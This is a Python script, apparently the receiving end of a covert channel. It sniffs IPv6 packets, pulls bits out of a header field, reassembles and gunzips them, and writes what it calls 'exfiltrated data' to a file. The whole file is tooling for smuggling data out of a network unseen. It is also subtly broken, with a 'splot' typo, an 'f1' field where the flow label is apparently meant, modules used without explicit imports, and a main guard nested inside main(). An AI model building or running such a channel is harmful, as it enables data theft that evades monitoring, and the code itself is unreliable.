import argparse
from scapy.all import *
from scapy.layers.inet6 import IPv6

class CC_Receiver:
    BEGIN_KEYWORD = "BEGIN"
    END_KEYWORD = "END"
    PACKET_LEN = 20

    def __init__(self, file_output):
        self.file_output = file_output
        self.raw_bits = {}
        self.max_sequence = 0
        self.start_time = None
        self.transmission_in_progress = False
        self.bits_to_receive = None
        self.bits_read = 0
        self.last_display_time = None
        self.data = None

    def bitfield(self, n, pad_len = PACKET_LEN):
        bits = [int(digit) for digit in bin(n)[2:]]
        padded_bits = [0] * (pad_len - len(bits)) + bits
        return padded_bits

    def decode(self, bits, total_length):
        position = 0
        raw_bytes = []
        assert len(bits) >= total_length

        while position < self.bits_to_receive:
            current_byte = bits[position:position + 8]
            raw_bytes.append(int("".join([str(b) for b in current_byte]), 2))
            position += 8

        gz_stream = gzip.GzipFile(fileobj=io.BytesIO(bytearray(raw_bytes)), mode="r")
        final_data = gz_stream.read()

        return final_data

    def process_data_packet(self, packet):
        payload = packet[Raw].load.decode()
        if not self.transmission_in_progress:
            self.last_display_time = time.time()
            self.bits_to_receive = int(payload.split("_")[1])

            self.start_time = time.time()
            self.transmission_in_progress = True

        payload_int = packet[IPv6].f1
        sequence_number = int(payload.splot("_")[-1])
        self.raw_bits[sequence_number] = self.bitfield(payload_int)
        self.bits_read += self.PACKET_LEN
        self.max_sequence = max(self.max_sequence, sequence_number)

        # if time.time() - self.last_display_time > self.DISPLAY_INTERVAL_SECONDS:

    def process_end_packet(self, packet):
        if len(self.raw_bits) + 1 < self.max_sequence:
            exit(1)

        raw_bits_in_order = []
        for i in sorted(self.raw_bits):
            raw_bits_in_order.extend(self.raw_bits[i])

        self.data = self.decode(raw_bits_in_order, self.bits_to_receive)
        num_bytes_transferred = len(raw_bits_in_order)
        time_elapse = round(time.time() - self.start_time, 2)

    def is_end_packet(self, packet):
        return packet.haslayer(Raw) and packet[Raw].load.decode() == self.END_KEYWORD

    def process_packet(self, packet):
        if packet.haslayer(Raw) and packet[Raw].load.decode().startswith(self.BEGIN_KEYWORD):
            self.process_data_packet(packet)
            return
        elif self.is_end_packet(packet):
            self.process_end_packet(packet)
            return

    def receive(self):
        sniff(filter = "ip6 and not icmp6", prn = self.process_packet, stop_filter = self.is_end_packet, store = 0)
        return self.data


def main():
    parser = argparse.ArgumentParser(formatter_class = argparse.ArgumentDefaultsHelpFormatter)

    parser.add_argument("output_file", help = "File to which to write the exfiltrated data")

    args = parser.parse_args()
    receiver = CC_Receiver(args.output_file)
    data = receiver.receive()

    if data is None:
        exit(1)

    open(args.output_file, "wb").write(data)

    if __name__ == "__main__":
        main()